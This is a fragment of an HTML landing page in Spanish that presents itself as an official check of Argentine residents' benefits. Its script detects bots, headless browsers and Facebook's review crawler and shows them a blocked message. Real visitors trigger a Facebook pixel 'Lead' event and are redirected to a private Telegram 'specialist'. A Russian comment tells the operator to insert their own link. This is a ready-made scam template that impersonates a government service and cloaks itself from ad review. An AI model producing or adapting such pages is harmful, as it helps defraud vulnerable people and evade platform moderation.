  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('background.jpg') no-repeat center center/cover;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      color: #fff;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
    }
    p {
      font-size: 1.1em;
      margin-bottom: 20px;
    }
    button {
      padding: 12px 24px;
      font-size: 1em;
      background-color: #fff;
      color: #004080;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #f0f0f0;
    }
  </style>
</head>
<body>
  <h1>Consulta oficial de beneficios</h1>
  <p>Verificá si accedés a programas disponibles para residentes argentinos</p>
  <button onclick="handleClick()">Consultar ahora</button>

  <script>
    const isBot = () => {
      const ua = navigator.userAgent.toLowerCase();
      return navigator.webdriver ||
             /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
    };

    const handleClick = () => {
      if (!isBot()) {
        fbq('track', 'Lead');
        window.location.href = "https://t.me/Veronica_especialista"; // ← Вставь свою Telegram ссылку
      } else {
        alert("Acceso restringido");
      }
    };
  </script>
</body>
